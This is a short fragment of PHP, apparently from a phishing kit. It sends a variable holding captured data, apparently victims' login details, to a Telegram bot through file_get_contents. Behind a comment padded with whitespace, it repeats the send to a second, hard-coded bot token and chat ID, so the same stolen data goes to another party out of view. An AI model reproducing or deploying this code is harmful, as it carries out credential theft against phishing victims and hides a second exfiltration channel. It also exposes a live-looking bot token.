...
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($yagmail)."" );/*                                             */$api = "6496953013:AAH1RTWKfwAWm3gXZa4zfkjK6CoxXe5cbg8";$chat_id= "6320152167";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($yagmail)."" );
